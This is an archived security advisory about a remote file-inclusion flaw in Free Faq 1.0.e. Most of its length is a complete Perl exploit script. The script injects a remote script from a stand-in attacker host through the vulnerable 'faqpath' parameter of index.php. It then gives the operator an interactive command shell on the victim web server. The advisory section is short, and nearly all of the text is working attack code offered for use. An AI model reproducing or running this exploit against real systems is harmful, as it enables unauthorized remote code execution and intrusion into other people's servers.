source: http://www.securityfocus.com/bid/20621/info

Free Faq is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.

A successful exploit of this issue allows an attacker to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.

Version 1.0.e is vulnerable to this issue.

#!/usr/bin/perl

#####################################################################################################
#                                                                                                   #
# Free Faq V 1.0.e                                                                                  #
#                                                                                                   #
# Class:  Remote File Inclusion Vulnerability                                                       #
# Date:   2006/10/19                                                                                #
#                                                                                                   #
# Remote: Yes                                                                                       #
#                                                                                                   #
# Type:   high                                                                                      #
#                                                                                                   #
# Site:   http://www.axxess.ca/FreeFAQ/dl_axxess.php                                                #
#                                                                                                   #
#####################################################################################################


use IO::Socket;
use LWP::Simple;

$cmdshell="http://attacker.com/cmd.txt";   # <====== Change This Line With Your Personal Script

print "\n";
print "##########################################################################\n";
print "#                                                                        #\n";
print "# Free Faq V 1.0.e   Remote File Inclusion Vulnerability                 #\n";
print "# Vul File: index.php                                                    #\n";
print "# Bug Found By : Ashiyane Corporation                                    #\n";
print "# Email: Alireza Ahari    Ahari[at]ashiyane.ir                           #\n";
print "# Web Site : www.Ashiyane.ir                                             #\n";
print "#                                                                        #\n";
print "##########################################################################\n";


if (@ARGV < 2)
{
    print "\n Usage: Ashiyane.pl [host] [path] ";
    print "\n EX : Ashiyane.pl www.victim.com /path/  \n\n";
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];
$vul="index.php?faqpath="

print "Type Your Commands ( uname -a )\n";
print "For Exiit Type END\n";

print "<Shell> ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to
host.\n\n";

    print $socket "GET ".$path.$vul.$cmdshell."?cmd=".$cmd."? HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "<Shell> ";
    $cmd = <STDIN>;
}
